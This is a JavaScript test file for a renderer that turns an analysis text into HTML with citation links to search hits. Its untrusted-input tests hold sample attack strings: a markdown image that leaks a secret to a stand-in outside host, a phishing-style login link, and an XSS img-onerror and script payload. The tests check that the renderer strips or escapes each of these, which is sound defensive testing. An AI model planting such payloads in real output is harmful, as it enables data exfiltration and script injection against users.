import { describe, test, expect } from "vitest";
import { renderAnalysis } from "components/search/renderAnalysis";

const hit = (id, title, content = `${title}.`) => ({
  content,
  metadata: { id: String(id), title }
});

const hits = [
  hit(101, "Fill pattern alarm"),
  hit(102, "BPM #2 tripped in cell 12"),
  hit(103, "Vacuum leak")
];

const links = (html) => {
  const doc = new DOMParser().parseFromString(html, "text/html");
  return [...doc.querySelectorAll("a")].map((a) => [
    a.textContent,
    a.dataset.entryId,
    a.getAttribute("href")
  ]);
};

describe("renderAnalysis citations", () => {
  test("#N links to the Nth hit, counting from 1", () => {
    const html = renderAnalysis("See #1 and (#2, #3).", hits);

    expect(links(html)).toEqual([
      ["#1", "101", "#entry-101"],
      ["#2", "102", "#entry-102"],
      ["#3", "103", "#entry-103"]
    ]);
  });

  test("numbers outside the hits are left as text", () => {
    const html = renderAnalysis("Ticket #4521, entry #4 and #0.", hits);

    expect(links(html)).toEqual([]);
    expect(html).toContain("Ticket #4521, entry #4 and #0.");
  });

  test("a device number taken from an entry is not a citation", () => {
    const html = renderAnalysis("BPM #2 tripped twice (#2).", hits);

    expect(links(html)).toEqual([["#2", "102", "#entry-102"]]);
    expect(html).toContain("BPM #2 tripped twice (");
  });

  test("code is left alone", () => {
    const html = renderAnalysis("Run `reset #1` or:\n\n    step #2\n", hits);

    expect(links(html)).toEqual([]);
    expect(html).toContain("<code>reset #1</code>");
  });

  test("a hit without an id is not linked", () => {
    const html = renderAnalysis("See #1.", [{ content: "x", metadata: {} }]);

    expect(links(html)).toEqual([]);
  });
});

describe("renderAnalysis treats the text as untrusted", () => {
  test("images are dropped, so the browser fetches nothing", () => {
    const html = renderAnalysis(
      "![status](https://outside.example/p.png?d=secret)",
      hits
    );

    expect(html).not.toContain("<img");
    expect(html).not.toContain("outside.example");
  });

  test("links lose their target and keep their text", () => {
    const html = renderAnalysis(
      "[sign in again](https://outside.example/login)",
      hits
    );

    expect(links(html)).toEqual([]);
    expect(html).toContain("sign in again");
    expect(html).not.toContain("outside.example");
  });

  test("raw HTML is shown as text", () => {
    const html = renderAnalysis(
      '<img src=x onerror="alert(1)"><script>alert(1)</script>',
      hits
    );
    const doc = new DOMParser().parseFromString(html, "text/html");

    expect(doc.querySelectorAll("img, script")).toHaveLength(0);
    expect(doc.body.textContent).toContain("<script>alert(1)</script>");
  });

  test("formatting survives", () => {
    const html = renderAnalysis("**Summary**\n\n- one\n- two", hits);

    expect(html).toContain("<strong>Summary</strong>");
    expect(html).toContain("<li>one</li>");
  });
});
